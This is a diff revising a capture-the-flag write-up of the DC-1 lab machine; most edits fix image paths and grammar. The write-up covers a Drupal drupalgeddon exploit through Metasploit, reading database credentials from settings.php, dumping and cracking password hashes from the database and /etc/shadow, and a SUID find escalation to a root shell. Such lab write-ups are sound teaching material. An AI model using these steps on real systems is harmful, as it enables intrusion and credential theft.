@@ -16,17 +16,15 @@ sudo netdiscover
 
 sudo arp-scan --localnet
 
-![1e6c0f44e1b4bfdf77ba7592acad48b9.png](../../../_resources/1e6c0f44e1b4bfdf77ba7592acad48b9.png)
+![1e6c0f44e1b4bfdf77ba7592acad48b9.png](resources/1e6c0f44e1b4bfdf77ba7592acad48b9.png)
 
-&nbsp;
+.![d0c5741dbc96fb1f86eae7ff566a23cf.png](resources/d0c5741dbc96fb1f86eae7ff566a23cf.png)
 
-.![d0c5741dbc96fb1f86eae7ff566a23cf.png](../../../_resources/d0c5741dbc96fb1f86eae7ff566a23cf.png)
+![9750acc2e46cda4f1450337e4783da40.png](resources/9750acc2e46cda4f1450337e4783da40.png)
 
-![9750acc2e46cda4f1450337e4783da40.png](../../../_resources/9750acc2e46cda4f1450337e4783da40.png)
+![656c00390a3447a2998cf2383a67b159.png](resources/656c00390a3447a2998cf2383a67b159.png)
 
-![656c00390a3447a2998cf2383a67b159.png](../../../_resources/656c00390a3447a2998cf2383a67b159.png)
-
-![e8241f5b41bd2fedde125d67ddd2d6dc.png](../../../_resources/e8241f5b41bd2fedde125d67ddd2d6dc.png)
+![e8241f5b41bd2fedde125d67ddd2d6dc.png](resources/e8241f5b41bd2fedde125d67ddd2d6dc.png)
 
 We have SSH, which is not vulnerable and it looks like we have a Drupal 7 CMS installation too. I tried `nikto` and `dirb`, but they didn’t pick up anything useful. So, I went on to check out the site and searched for version numbers. I also tried `admin - admin` on the login panel, but no luck.
 
@@ -34,17 +32,15 @@ We have SSH, which is not vulnerable and it looks like we have a Drupal 7 CMS in
 
 Some Drupal sites are vulnerable to drupalgeddon, which is basically an SQL injection vulnerability disclosed back in late 2014. I fired up my Metasploit console and searched for `drupal`.
 
-![0d05117759d306b52592254c554b982f.png](../../../_resources/0d05117759d306b52592254c554b982f.png)
+![0d05117759d306b52592254c554b982f.png](resources/0d05117759d306b52592254c554b982f.png)
 
-You can find more about this module on rapid7’s site: <ins>https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon</ins> I set the `rhosts` variable and simply typed `exploit`.![2c4bff6fdbab748257c8d185ce2ffda8.png](../../../_resources/2c4bff6fdbab748257c8d185ce2ffda8.png)
+You can find more about this module on rapid7’s site: <ins>https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon</ins> I set the `rhosts` variable and simply typed `exploit`.![2c4bff6fdbab748257c8d185ce2ffda8.png](resources/2c4bff6fdbab748257c8d185ce2ffda8.png)
 
-![416de3a9f681b6dc3ca4fa5c18568823.png](../../../_resources/416de3a9f681b6dc3ca4fa5c18568823.png)
+![416de3a9f681b6dc3ca4fa5c18568823.png](resources/416de3a9f681b6dc3ca4fa5c18568823.png)
 
-![ddc0c1d8d1d45eeb7fa55ea9dbf6a83c.png](../../../_resources/ddc0c1d8d1d45eeb7fa55ea9dbf6a83c.png)
+![ddc0c1d8d1d45eeb7fa55ea9dbf6a83c.png](resources/ddc0c1d8d1d45eeb7fa55ea9dbf6a83c.png)
 
-![44d1ea6ba7af2e9ca3abdd29ab4a3b1b.png](../../../_resources/44d1ea6ba7af2e9ca3abdd29ab4a3b1b.png)
-
-&nbsp;
+![44d1ea6ba7af2e9ca3abdd29ab4a3b1b.png](resources/44d1ea6ba7af2e9ca3abdd29ab4a3b1b.png)
 
 This was easy, right? I typed `shell` to conveniently investigate the files and directories on the server.
 
@@ -84,21 +80,20 @@ drwxr-xr-x  7 www-data www-data  4096 Nov 21  2013 themes
 -rw-r--r--  1 www-data www-data   417 Nov 21  2013 xmlrpc.php
 ```
 
-The first flag is right in front of us, which contained the following hint:
+The first flag is right in front of us, which contains the following hint:
 
 > *Every good CMS needs a config file — and so do you.*
 
-The goal was pretty clear, I had to find a juicy config file. I just freely explored the directory to see, what I can find. In the `sites/default` directory, there was a `settings.php` file.
+The goal was clear; I had to find a juicy config file. I just freely explored the directory to see what I could find. In the `sites/default` directory, there was a `settings.php` file.
 
-![2749fe1910b03fd3ae8d7edfeda7244d.png](../../../_resources/2749fe1910b03fd3ae8d7edfeda7244d.png)
+![2749fe1910b03fd3ae8d7edfeda7244d.png](resources/2749fe1910b03fd3ae8d7edfeda7244d.png)
 
-![5112814cc146f078e913feedd5ad1ad9.png](../../../_resources/5112814cc146f078e913feedd5ad1ad9.png)
+![5112814cc146f078e913feedd5ad1ad9.png](resources/5112814cc146f078e913feedd5ad1ad9.png)
 
-&nbsp;
 
-![22170ead9677a65b07f743645be11022.png](../../../_resources/22170ead9677a65b07f743645be11022.png)
+![22170ead9677a65b07f743645be11022.png](resources/22170ead9677a65b07f743645be11022.png)
 
-&nbsp;array (  
+array (  
       'database' => 'drupaldb',  
       'username' => 'dbuser',  
       'password' => 'R0',  
@@ -107,33 +102,31 @@ The goal was pretty clear, I had to find a juicy config file. I just freely expl
       'driver' => 'mysql',  
       'prefix' => '',
 
-&nbsp;
 
-In the beginning of the file, there was a comment, which contained the second flag and below that I was presented with the username and password for the database.
+
+At the beginning of the file, there was a comment that contained the second flag, and below that, I was presented with the username and password for the database.
 
 In order to log in to the database, we have to have a tty or pseudo-tty shell. At the moment, we have a very limited shell. Python was installed on the machine and all I had to do was:
 
 python -c 'import pty; pty.spawn ("/bin/sh")'
 
-![4042101fb88efd4c40357acf0811b81c.png](../../../_resources/4042101fb88efd4c40357acf0811b81c.png)
+![4042101fb88efd4c40357acf0811b81c.png](resources/4042101fb88efd4c40357acf0811b81c.png)
 
 I had everything to log in to the MySQL database. I looked at the databases and selected the `drupaldb`.
 
-not: if you forget to type ; you can add aftre
+not: if you forget to type, you can add after
 
-![fb8d85a420b29f11189666d851c4e4cf.png](../../../_resources/fb8d85a420b29f11189666d851c4e4cf.png)
+![fb8d85a420b29f11189666d851c4e4cf.png](resources/fb8d85a420b29f11189666d851c4e4cf.png)
 
-![27689a9dec59c1ca5c82c43ead9bcf2f.png](../../../_resources/27689a9dec59c1ca5c82c43ead9bcf2f.png)
+![27689a9dec59c1ca5c82c43ead9bcf2f.png](resources/27689a9dec59c1ca5c82c43ead9bcf2f.png)
 
-Before making any queries, we have to know the table names. The result quite big, but I focused on the important one (the `users` table).
+Before making any queries, we have to know the table names. The result is quite big, but I focused on the important one (the `users` table).
 
 use drupaldb; show tables;
 
-![ad9a414c989e011eeaa6b6759398327a.png](../../../_resources/ad9a414c989e011eeaa6b6759398327a.png)
+![ad9a414c989e011eeaa6b6759398327a.png](resources/ad9a414c989e011eeaa6b6759398327a.png)
 
 select\*from user;
-
-&nbsp;
 
 ```
 mysql> show tables;
@@ -226,7 +219,7 @@ mysql> show tables;
 
 # Dumping database hashes
 
-The ran the following query to print out every entry in that specific table. I had to cut the actual result because it was too long.
+They ran the following query to print out every entry in that specific table. I had to cut the actual result because it was too long.
 
 select\*from user;
 
@@ -274,7 +267,7 @@ Hardware.Mon.#1..: Temp: 69c Fan: 47% Util: 96% Core:1809MHz Mem:3802MHz Bus:16
 
 I didn’t have to wait too long for the admin’s password. The password was `53cr3t`. I logged in and under the content menu, I found the third flag.
 
-![b412b56a4928bc1df30d17b24d7d651d.png](../../../_resources/b412b56a4928bc1df30d17b24d7d651d.png)
+![b412b56a4928bc1df30d17b24d7d651d.png](resources/b412b56a4928bc1df30d17b24d7d651d.png)
 
 > *Special PERMS will help FIND the passwd — but you’ll need to -exec that command to work out how to get what’s in the shadow.*
 
@@ -397,7 +390,7 @@ flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc
 
 I copied this information into a text file and ran `john` on it to crack the hashes. I have successfully cracked the `flag4` user password.
 
-![b7249b2a3dc6d48904d8e11642805c95.png](../../../_resources/b7249b2a3dc6d48904d8e11642805c95.png)
+![b7249b2a3dc6d48904d8e11642805c95.png](resources/b7249b2a3dc6d48904d8e11642805c95.png)
 
 ```
 ▲ ~/Downloads john shadow.txt --show
@@ -405,7 +398,7 @@ flag4:orange:17946:0:99999:7:::
 1 password hash cracked, 1 left
 ```
 
-# ![4a8ff268ff7b5aa7d6a8bfc411783d49.png](../../../_resources/4a8ff268ff7b5aa7d6a8bfc411783d49.png)
+# ![4a8ff268ff7b5aa7d6a8bfc411783d49.png](resources/4a8ff268ff7b5aa7d6a8bfc411783d49.png)
 
 root:$6$rhe3rFqk\$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::
 
@@ -417,7 +410,7 @@ or
 
 john --show hashfilename(hashes.txt)
 
-![fd78b5c2895f6781e0f5909a0c320587.png](../../../_resources/fd78b5c2895f6781e0f5909a0c320587.png)
+![fd78b5c2895f6781e0f5909a0c320587.png](resources/fd78b5c2895f6781e0f5909a0c320587.png)
 
 # Access via SSH
 
@@ -449,7 +442,7 @@ flag4@DC-1:~$
 
 # Popping a root shell
 
-Since I found the find command with root SUID set I could easily read the final flag and consider this challenge done. I wanted to take these extra steps to fully compromise the system and not just go for root access immediately, but this time has come.
+Since I found the find command with root SUID set, I could easily read the final flag and consider this challenge done. I wanted to take these extra steps to fully compromise the system and not just go for root access immediately, but this time has come.
 
 ```
 flag4@DC-1:~$ find . -exec '/bin/sh' \; 
